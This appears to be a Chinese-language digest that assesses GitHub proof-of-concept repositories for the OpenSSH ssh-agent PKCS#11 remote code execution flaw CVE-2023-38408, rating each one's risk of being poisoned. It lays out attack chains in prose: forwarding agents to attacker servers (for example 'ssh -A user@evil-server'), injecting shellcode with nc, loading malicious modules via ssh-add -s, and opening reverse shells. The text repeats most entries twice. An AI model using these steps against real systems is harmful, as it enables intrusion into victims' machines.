该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
PoC代码中，攻击者IP的获取方式提供了多种选择，包括用户输入、硬编码和自动获取。脚本首先清除`/tmp`目录下之前的ssh会话，然后将Alice的ssh公钥添加到root用户的`authorized_keys`中。然后等待攻击者通过SSH登录到Redqueen机器，并输入`echo ${attackerIP} > /tmp/ip.txt`。脚本会找到`SSH_AUTH_SOCK`环境变量，并使用`nc`命令向其发送shellcode，然后通过加载多个恶意的.so文件，触发segmentation fault，并最终执行注入的shellcode。

分析脚本内容，发现以下几点：

*   脚本依赖于特定的环境（TryHackMe Lab Environment），这限制了其通用性。
*   脚本中包含了一些硬编码的IP地址和密码，这可能被用于进行未经授权的访问。
*   脚本尝试向/root/.ssh/authorized_keys中写入数据，这可能会影响系统的安全性。

虽然存在上述风险，但整体来说，该PoC更像是一个为了演示漏洞原理而编写的脚本，主要的目的是为了在受害者机器上执行命令，而并非留下后门。风险在于使用者如果直接使用未修改的脚本，可能会将自己的IP地址暴露给攻击者，或者将自己的SSH密钥泄露给攻击者，但是这并非PoC作者的本意，而是使用者不当使用造成的。

因此，将投毒风险评估为1%。

**利用方式：**
1.  攻击者搭建一个恶意的SSH服务器。
2.  诱骗受害者开启ssh-agent转发并连接到该恶意服务器 (`ssh -A user@evil-server`)。
3.  恶意服务器利用`ssh-add -s`向受害者的ssh-agent中注入恶意PKCS#11模块。
4.  当受害者尝试使用ssh-agent进行身份验证时，恶意模块将被加载并执行，从而实现远程代码执行。

**项目地址:** [kali-mx/CVE-2023-38408](https://github.com/kali-mx/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #7

**来源**: [CVE-2023-38408-mrtacojr_CVE-2023-38408.md](../2023/CVE-2023-38408-mrtacojr_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent forwarding，且连接到受攻击者控制的系统。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2023-38408 是 OpenSSH 9.3p2 之前版本中 ssh-agent 的 PKCS#11 功能中存在的一个漏洞，由于搜索路径不安全，导致远程代码执行。如果 ssh-agent 被转发到受攻击者控制的系统，攻击者可以利用该漏洞执行任意代码。

**有效性：** 根据漏洞描述和搜索结果，该漏洞真实存在且影响OpenSSH 9.3p2之前的版本。虽然提供的POC不是直接的exp，但其功能为重新编译安装OpenSSH，如果攻击者在编译过程中注入恶意代码，则可能达到远程代码执行的目的。因此，从间接角度来看，此POC具有一定的有效性，可以作为漏洞利用的一部分。

**投毒风险：** POC代码的主要功能是下载、编译和安装OpenSSH。以下是对投毒风险的分析：
*   **下载源文件：** 从`https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1:9.6p1-3ubuntu13.4/openssh_9.6p1.orig.tar.gz` 下载 OpenSSH 9.6p1 版本的源代码。理论上，这应该是一个可信的来源，但是攻击者可能篡改下载链接，指向包含后门的恶意代码。
*   **编译过程：** 在 `./configure` 和 `make` 步骤中，攻击者可以注入恶意代码。例如，修改Makefile以插入恶意指令，或者修改源代码本身。这是最主要的投毒风险点。
*   **systemd 服务文件：** 脚本创建了一个systemd服务文件。虽然文件本身看起来无害，但攻击者可以在`ExecStart`指令中插入恶意命令，在sshd启动时执行。

综合以上分析，此脚本存在很高的投毒风险。如果攻击者控制了脚本的执行，可以在多个环节注入恶意代码。因此，投毒风险估计为80%。

**利用方式：**
1.  **攻击者控制的服务器：** 攻击者需要搭建一个可以控制的服务器。
2.  **诱导连接：** 诱导用户使用开启agent forwarding的SSH客户端连接到该服务器（`ssh -A user@attacker.com`）。
3.  **篡改环境：** 攻击者在受害者连接的服务器上，通过篡改`LD_LIBRARY_PATH`或其它环境变量，劫持ssh-agent加载恶意PKCS#11模块。
4.  **远程代码执行：**  当ssh-agent尝试加载恶意模块时，执行攻击者预先设定的恶意代码。

**项目地址:** [mrtacojr/CVE-2023-38408](https://github.com/mrtacojr/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #8

**来源**: [CVE-2023-38408-wxrdnx_CVE-2023-38408.md](../2023/CVE-2023-38408-wxrdnx_CVE-2023-38408.md)

# CVE-2023-38408

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md](../2023/CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和权限提升

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并且攻击者能够控制目标服务器文件系统

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于OpenSSH的ssh-agent的PKCS#11功能中，由于搜索路径不安全导致。攻击者可以通过控制转发的agent-socket，并在受害者机器上写入文件，从而执行任意代码。根据提供的POC，攻击者首先连接到服务器，然后利用`nc`将shellcode注入到agent的内存中，再通过`ssh-add -s`加载恶意的动态链接库，触发SIGSEGV信号来劫持程序执行流程，最终通过shellcode建立反向连接。

**漏洞利用有效性评估：**

根据漏洞描述和POC代码，该漏洞利用方法是有效的。POC详细描述了利用过程，包括如何获取SSH Agent socket，如何注入shellcode，以及如何利用SIGSEGV信号劫持控制流。

**投毒风险评估：**

仓库本身主要提供的是漏洞的利用方法和复现步骤，直接的恶意代码(比如后门)可能性较低，但仍然存在一定的风险。例如，POC中依赖的动态链接库和shellcode可能存在被替换成恶意版本的风险，例如监听反弹shell。另外，利用过程中需要手动执行一些步骤，这使得插入恶意代码的机会增加。考虑到POC代码的复杂性和潜在的风险，投毒风险估计为10%。

**漏洞利用方式：**

1.  **前提条件:** 需要OpenSSH Agent Forwarding开启，攻击者需要能够控制目标服务器的文件系统，并且目标OpenSSH版本低于9.3p2。
2.  **获取SSH Agent Socket:** 攻击者需要找到受害者SSH Agent的Socket文件（`$SSH_AUTH_SOCK`）。
3.  **注入Shellcode:**  利用`nc`命令将精心构造的shellcode注入到SSH Agent进程的内存中。Shellcode的目的是建立一个反向连接，让攻击者可以执行命令。
4.  **加载恶意动态链接库:** 使用 `ssh-add -s` 命令添加恶意的动态链接库 (`libttcn3-rt2-dynamic.so`, `libKF5SonnetUi.so.5.92.0` 和 `libns3.35-wave.so.0.0.0`)。
5.  **触发SIGSEGV:**  加载的恶意动态链接库会触发一个段错误 (SIGSEGV)。
6.  **劫持控制流:**  通过劫持SIGSEGV信号处理程序，将程序控制流导向之前注入的shellcode。
7.  **反向连接与命令执行:**  Shellcode建立一个反向连接，攻击者可以通过这个连接在受害者机器上执行任意命令。

**项目地址:** [LucasPDiniz/CVE-2023-38408](https://github.com/LucasPDiniz/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #2

**来源**: [CVE-2023-38408-Nick-Morbid_cve-2023-38408.md](../2023/CVE-2023-38408-Nick-Morbid_cve-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** < 9.3p2

**利用条件:** 需要启用ssh-agent转发，且目标系统使用存在漏洞的OpenSSH版本。攻击者需要控制中间人服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于不充分的可信搜索路径导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以通过加载恶意的 PKCS#11 模块来执行任意代码。

**有效性:**
提供的 POC 代码 `malicious_ssh_server.py` 模拟了一个恶意的 SSH 服务器。该服务器会记录用户名和密码，并在建立通道后发送恶意负载。但是，此POC*本身*并不能直接利用 CVE-2023-38408 漏洞。它更多的是模拟了中间人攻击中恶意服务器的角色。要利用 CVE-2023-38408，需要一个恶意的PKCS#11模块。

**投毒风险:**
该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
PoC代码中，攻击者IP的获取方式提供了多种选择，包括用户输入、硬编码和自动获取。脚本首先清除`/tmp`目录下之前的ssh会话，然后将Alice的ssh公钥添加到root用户的`authorized_keys`中。然后等待攻击者通过SSH登录到Redqueen机器，并输入`echo ${attackerIP} > /tmp/ip.txt`。脚本会找到`SSH_AUTH_SOCK`环境变量，并使用`nc`命令向其发送shellcode，然后通过加载多个恶意的.so文件，触发segmentation fault，并最终执行注入的shellcode。

分析脚本内容，发现以下几点：

*   脚本依赖于特定的环境（TryHackMe Lab Environment），这限制了其通用性。
*   脚本中包含了一些硬编码的IP地址和密码，这可能被用于进行未经授权的访问。
*   脚本尝试向/root/.ssh/authorized_keys中写入数据，这可能会影响系统的安全性。

虽然存在上述风险，但整体来说，该PoC更像是一个为了演示漏洞原理而编写的脚本，主要的目的是为了在受害者机器上执行命令，而并非留下后门。风险在于使用者如果直接使用未修改的脚本，可能会将自己的IP地址暴露给攻击者，或者将自己的SSH密钥泄露给攻击者，但是这并非PoC作者的本意，而是使用者不当使用造成的。

因此，将投毒风险评估为1%。

**利用方式：**
1.  攻击者搭建一个恶意的SSH服务器。
2.  诱骗受害者开启ssh-agent转发并连接到该恶意服务器 (`ssh -A user@evil-server`)。
3.  恶意服务器利用`ssh-add -s`向受害者的ssh-agent中注入恶意PKCS#11模块。
4.  当受害者尝试使用ssh-agent进行身份验证时，恶意模块将被加载并执行，从而实现远程代码执行。

**项目地址:** [kali-mx/CVE-2023-38408](https://github.com/kali-mx/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #7

**来源**: [CVE-2023-38408-mrtacojr_CVE-2023-38408.md](../2023/CVE-2023-38408-mrtacojr_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent forwarding，且连接到受攻击者控制的系统。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2023-38408 是 OpenSSH 9.3p2 之前版本中 ssh-agent 的 PKCS#11 功能中存在的一个漏洞，由于搜索路径不安全，导致远程代码执行。如果 ssh-agent 被转发到受攻击者控制的系统，攻击者可以利用该漏洞执行任意代码。

**有效性：** 根据漏洞描述和搜索结果，该漏洞真实存在且影响OpenSSH 9.3p2之前的版本。虽然提供的POC不是直接的exp，但其功能为重新编译安装OpenSSH，如果攻击者在编译过程中注入恶意代码，则可能达到远程代码执行的目的。因此，从间接角度来看，此POC具有一定的有效性，可以作为漏洞利用的一部分。

**投毒风险：** POC代码的主要功能是下载、编译和安装OpenSSH。以下是对投毒风险的分析：
*   **下载源文件：** 从`https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1:9.6p1-3ubuntu13.4/openssh_9.6p1.orig.tar.gz` 下载 OpenSSH 9.6p1 版本的源代码。理论上，这应该是一个可信的来源，但是攻击者可能篡改下载链接，指向包含后门的恶意代码。
*   **编译过程：** 在 `./configure` 和 `make` 步骤中，攻击者可以注入恶意代码。例如，修改Makefile以插入恶意指令，或者修改源代码本身。这是最主要的投毒风险点。
*   **systemd 服务文件：** 脚本创建了一个systemd服务文件。虽然文件本身看起来无害，但攻击者可以在`ExecStart`指令中插入恶意命令，在sshd启动时执行。

综合以上分析，此脚本存在很高的投毒风险。如果攻击者控制了脚本的执行，可以在多个环节注入恶意代码。因此，投毒风险估计为80%。

**利用方式：**
1.  **攻击者控制的服务器：** 攻击者需要搭建一个可以控制的服务器。
2.  **诱导连接：** 诱导用户使用开启agent forwarding的SSH客户端连接到该服务器（`ssh -A user@attacker.com`）。
3.  **篡改环境：** 攻击者在受害者连接的服务器上，通过篡改`LD_LIBRARY_PATH`或其它环境变量，劫持ssh-agent加载恶意PKCS#11模块。
4.  **远程代码执行：**  当ssh-agent尝试加载恶意模块时，执行攻击者预先设定的恶意代码。

**项目地址:** [mrtacojr/CVE-2023-38408](https://github.com/mrtacojr/CVE-2023-38408)

